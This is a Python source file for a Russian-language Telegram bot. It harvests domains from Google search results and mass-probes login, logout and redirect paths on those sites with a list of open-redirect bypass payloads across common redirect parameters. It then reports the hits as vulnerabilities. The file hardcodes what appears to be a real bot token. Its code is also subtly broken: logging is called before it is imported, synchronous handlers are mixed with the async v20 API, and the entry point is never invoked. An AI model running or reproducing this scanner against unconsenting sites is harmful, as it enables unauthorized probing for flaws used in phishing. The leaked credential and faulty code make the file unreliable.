#!/usr/bin/env python3
"""
Open Redirect Telegram Bot
Автор: Колин (для деревни)
Запуск: python3 open_redirect_bot.py
"""

import sys
import types

# Принудительно выводим всё в stdout
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    stream=sys.stdout  # ← Эта строка важна!
)

# Заглушка для imghdr (нужна для python-telegram-bot на Python 3.14+)
imghdr = types.ModuleType('imghdr')
def what(*args, **kwargs):
    return None
imghdr.what = what
sys.modules['imghdr'] = imghdr

import os
import requests
import time
import random
import re
import json
from urllib.parse import urlparse, quote_plus
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
import logging

from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackContext
from telegram.ext import filters

# ===================== НАСТРОЙКИ =====================
TOKEN = "8618230715:AAF30AK5Nef4KnLuILUXu7GKpKO4TLrHWYc"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
]

REDIRECT_PARAMS = [
    "redirect", "url", "next", "return", "returnTo", "return_to",
    "continue", "dest", "destination", "redir", "redirect_uri",
    "redirect_url", "goto", "target", "r", "u", "link", "to"
]

TEST_PAYLOAD = "https://example.com"
ENCODED_PAYLOAD = quote_plus(TEST_PAYLOAD)

PAYLOADS = [
    TEST_PAYLOAD,
    f"//example.com",
    f"http://example.com",
    f"https:example.com",
    f"/\\example.com",
    f"https://example.com%2F%2E%2E",
    f"%2F%2Fexample.com",
    f"///example.com",
    f"https://example.com/?a=1&b=2",
    f"https://example.com#test",
]

# Для хранения состояния пользователей
user_sessions = {}
sessions_lock = Lock()

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===================== ФУНКЦИИ ПОИСКА ДОМЕНОВ =====================

def search_domains_google(query="site:.com", max_pages=2):
    """Ищет домены через Google"""
    domains = set()
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    
    for page in range(max_pages):
        start = page * 10
        url = f"https://www.google.com/search?q={query}&start={start}"
        
        try:
            r = requests.get(url, headers=headers, timeout=10)
            found = re.findall(r'https?://([^/\s"\']+)', r.text)
            
            for domain in found:
                domain = domain.split('/')[0].split('?')[0].split('#')[0]
                if '.' in domain and not any(x in domain for x in ['google', 'youtube', 'blogger']):
                    domains.add(domain)
            
            time.sleep(random.uniform(2, 4))
        except Exception:
            continue
    
    return list(domains)

def generate_urls_from_domain(domain):
    """Генерирует URL для сканирования"""
    common_paths = [
        "/", "/login", "/logout", "/redirect", "/callback", "/auth",
        "/oauth", "/oauth2", "/signin", "/signout", "/return", "/goto",
        "/external", "/out", "/link", "/away", "/go", "/click", "/track",
        "/r", "/u", "/l", "/redirect.php", "/redir.php", "/url.php",
        "/wp-login.php", "/wp-admin", "/admin", "/user/logout",
        "/session/logout", "/account/logout"
    ]
    
    protocols = ["http://", "https://"]
    urls = []
    
    for proto in protocols:
        base = proto + domain
        for path in common_paths:
            urls.append(base + path)
    
    return urls

# ===================== ФУНКЦИИ СКАНИРОВАНИЯ =====================

def check_open_redirect(url, param, payload):
    """Проверяет один параметр"""
    if '?' in url:
        separator = '&'
    else:
        separator = '?'
    
    test_url = f"{url}{separator}{param}={payload}"
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    
    try:
        r = requests.get(test_url, headers=headers, timeout=8, allow_redirects=False)
        
        if 'Location' in r.headers:
            location = r.headers['Location']
            if 'example.com' in location or payload.replace('https://', '').replace('http://', '') in location:
                return {
                    "vulnerable": True,
                    "url": test_url,
                    "param": param,
                    "payload": payload,
                    "location": location,
                    "status": r.status_code
                }
        
        if 300 <= r.status_code < 400 and 'example.com' in r.text.lower():
            return {
                "vulnerable": True,
                "url": test_url,
                "param": param,
                "payload": payload,
                "status": r.status_code,
                "type": "meta/html"
            }
        
        return None
    except Exception:
        return None

def scan_single_url(url):
    """Сканирует один URL"""
    results = []
    for param in REDIRECT_PARAMS:
        for payload in PAYLOADS:
            result = check_open_redirect(url, param, payload)
            if result:
                results.append(result)
    return results

def scan_urls(urls, max_workers=5, progress_callback=None):
    """Сканирует список URL с прогрессом"""
    all_results = {}
    total = len(urls)
    completed = 0
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_url = {executor.submit(scan_single_url, url): url for url in urls}
        
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            completed += 1
            if progress_callback:
                progress_callback(completed, total)
            
            try:
                results = future.result()
                if results:
                    all_results[url] = results
            except Exception:
                continue
    
    return all_results

# ===================== ОБРАБОТЧИКИ TELEGRAM =====================

def start(update: Update, context: CallbackContext):
    """Обработчик команды /start"""
    user = update.effective_user
    update.message.reply_text(
        f"Привет, {user.first_name}!\n\n"
        "Я бот для поиска Open Redirect уязвимостей.\n\n"
        "Команды:\n"
        "/search - Найти домены и просканировать\n"
        "/scanurl - Сканировать конкретный URL\n"
        "/scanlist - Сканировать список URL из файла\n"
        "/help - Подробная помощь"
    )

def help_command(update: Update, context: CallbackContext):
    """Обработчик команды /help"""
    help_text = """
*Open Redirect Bot - Помощь*

*Команды:*

/search - Поиск доменов и сканирование
   Бот найдет домены через Google и просканирует их.

/scanurl - Сканировать конкретный URL
   Отправь URL, и бот проверит его на open redirect.

/scanlist - Сканировать список URL из файла
   Отправь текстовый файл с URL (по одному на строку).

*Как использовать:*
1. Выбери команду
2. Следуй инструкциям бота
3. Жди результатов (может занять время)

*Результаты:*
Бот покажет найденные уязвимости с параметрами и тестовыми URL.
"""
    update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)

def search_command(update: Update, context: CallbackContext):
    """Обработчик команды /search"""
    user_id = update.effective_user.id
    
    with sessions_lock:
        user_sessions[user_id] = {
            'state': 'awaiting_search_query',
            'data': {}
        }
    
    update.message.reply_text(
        "Введите поисковый запрос для Google (например: site:.edu login)\n"
        "Или отправьте 'default' для поиска site:.com"
    )

def scanurl_command(update: Update, context: CallbackContext):
    """Обработчик команды /scanurl"""
    user_id = update.effective_user.id
    
    with sessions_lock:
        user_sessions[user_id] = {
            'state': 'awaiting_url',
            'data': {}
        }
    
    update.message.reply_text(
        "Отправьте URL для сканирования (например: https://example.com/login)"
    )

def scanlist_command(update: Update, context: CallbackContext):
    """Обработчик команды /scanlist"""
    user_id = update.effective_user.id
    
    with sessions_lock:
        user_sessions[user_id] = {
            'state': 'awaiting_file',
            'data': {}
        }
    
    update.message.reply_text(
        "Отправьте текстовый файл с URL (по одному на строку)"
    )

def handle_message(update: Update, context: CallbackContext):
    """Обработчик текстовых сообщений"""
    user_id = update.effective_user.id
    text = update.message.text
    
    with sessions_lock:
        session = user_sessions.get(user_id)
        if not session:
            update.message.reply_text("Используйте /start для начала работы")
            return
    
    state = session.get('state')
    
    if state == 'awaiting_search_query':
        query = text if text != 'default' else 'site:.com'
        
        update.message.reply_text(f"🔍 Ищу домены по запросу: {query}")
        
        try:
            domains = search_domains_google(query, max_pages=2)
            update.message.reply_text(f"✅ Найдено доменов: {len(domains)}")
            
            if not domains:
                update.message.reply_text("❌ Домены не найдены")
                return
            
            urls = []
            for domain in domains[:20]:
                urls.extend(generate_urls_from_domain(domain))
            
            update.message.reply_text(f"🔍 Сканирую {len(urls)} URL... Это может занять время")
            
            def progress(current, total):
                if current % 50 == 0 or current == total:
                    context.bot.send_message(
                        chat_id=user_id,
                        text=f"Прогресс: {current}/{total}"
                    )
            
            results = scan_urls(urls, max_workers=5, progress_callback=progress)
            
            if results:
                msg = f"✅ Найдено уязвимостей на {len(results)} URL:\n\n"
                for url, vulns in list(results.items())[:10]:
                    msg += f"📍 {url}\n"
                    for v in vulns[:3]:
                        msg += f"   Параметр: {v['param']}\n"
                    msg += "\n"
                
                if len(results) > 10:
                    msg += f"... и еще {len(results)-10} URL\n"
                
                filename = f"results_{user_id}.txt"
                with open(filename, 'w') as f:
                    for url, vulns in results.items():
                        f.write(f"\n[VULN] {url}\n")
                        for v in vulns:
                            f.write(f"  {v['param']} -> {v.get('location', 'N/A')}\n")
                
                update.message.reply_text(msg)
                with open(filename, 'rb') as f:
                    context.bot.send_document(chat_id=user_id, document=f)
                
                os.remove(filename)
            else:
                update.message.reply_text("❌ Уязвимостей не найдено")
            
        except Exception as e:
            update.message.reply_text(f"❌ Ошибка: {str(e)}")
        
        with sessions_lock:
            del user_sessions[user_id]
    
    elif state == 'awaiting_url':
        url = text
        
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        update.message.reply_text(f"🔍 Сканирую {url}...")
        
        try:
            results = scan_single_url(url)
            
            if results:
                msg = f"✅ Найдено уязвимостей: {len(results)}\n\n"
                for v in results[:10]:
                    msg += f"📍 Параметр: {v['param']}\n"
                    msg += f"   Тест: {v['url']}\n"
                    if 'location' in v:
                        msg += f"   Редирект на: {v['location']}\n"
                    msg += "\n"
                
                update.message.reply_text(msg)
            else:
                update.message.reply_text("❌ Уязвимостей не найдено")
            
        except Exception as e:
            update.message.reply_text(f"❌ Ошибка: {str(e)}")
        
        with sessions_lock:
            del user_sessions[user_id]

def handle_file(update: Update, context: CallbackContext):
    """Обработчик файлов"""
    user_id = update.effective_user.id
    
    with sessions_lock:
        session = user_sessions.get(user_id)
        if not session or session.get('state') != 'awaiting_file':
            update.message.reply_text("Используйте /scanlist для загрузки файла")
            return
    
    file = update.message.document
    if not file.file_name.endswith('.txt'):
        update.message.reply_text("❌ Пожалуйста, отправьте текстовый файл (.txt)")
        return
    
    update.message.reply_text("📥 Загружаю файл...")
    
    file_obj = file.get_file()
    filename = f"upload_{user_id}.txt"
    file_obj.download(filename)
    
    try:
        with open(filename, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
        
        if not urls:
            update.message.reply_text("❌ Файл пуст")
            return
        
        update.message.reply_text(f"✅ Загружено {len(urls)} URL")
        
        urls = [u if u.startswith(('http://', 'https://')) else 'https://' + u for u in urls]
        
        update.message.reply_text(f"🔍 Сканирую {len(urls)} URL... Это может занять время")
        
        def progress(current, total):
            if current % 20 == 0 or current == total:
                context.bot.send_message(
                    chat_id=user_id,
                    text=f"Прогресс: {current}/{total}"
                )
        
        results = scan_urls(urls, max_workers=5, progress_callback=progress)
        
        if results:
            msg = f"✅ Найдено уязвимостей на {len(results)} URL:\n\n"
            for url, vulns in list(results.items())[:10]:
                msg += f"📍 {url}\n"
                for v in vulns[:3]:
                    msg += f"   Параметр: {v['param']}\n"
                msg += "\n"
            
            if len(results) > 10:
                msg += f"... и еще {len(results)-10} URL\n"
            
            results_filename = f"results_{user_id}.txt"
            with open(results_filename, 'w') as f:
                for url, vulns in results.items():
                    f.write(f"\n[VULN] {url}\n")
                    for v in vulns:
                        f.write(f"  {v['param']} -> {v.get('location', 'N/A')}\n")
            
            update.message.reply_text(msg)
            with open(results_filename, 'rb') as f:
                context.bot.send_document(chat_id=user_id, document=f)
            
            os.remove(results_filename)
        else:
            update.message.reply_text("❌ Уязвимостей не найдено")
        
    except Exception as e:
        update.message.reply_text(f"❌ Ошибка: {str(e)}")
    finally:
        if os.path.exists(filename):
            os.remove(filename)
        
        with sessions_lock:
            del user_sessions[user_id]

def error_handler(update: Update, context: CallbackContext):
    """Обработчик ошибок"""
    logger.error(f"Ошибка: {context.error}")

# ===================== ЗАПУСК БОТА =====================

def main():
    """Запуск бота"""
    sys.stdout.flush()  # ← Принудительно сбрасываем буфер
    # Новый способ создания приложения (для версии 20.x)
    application = Application.builder().token(TOKEN).build()
    
    # Добавляем обработчики команд
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("search", search_command))
    application.add_handler(CommandHandler("scanurl", scanurl_command))
    application.add_handler(CommandHandler("scanlist", scanlist_command))
    
    # Добавляем обработчики сообщений
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    
    # Добавляем обработчик ошибок
    application.add_error_handler(error_handler)
    
    print("Бот запущен...")
    # Запускаем бота
    sys.stdout.flush()
    application.run_polling()




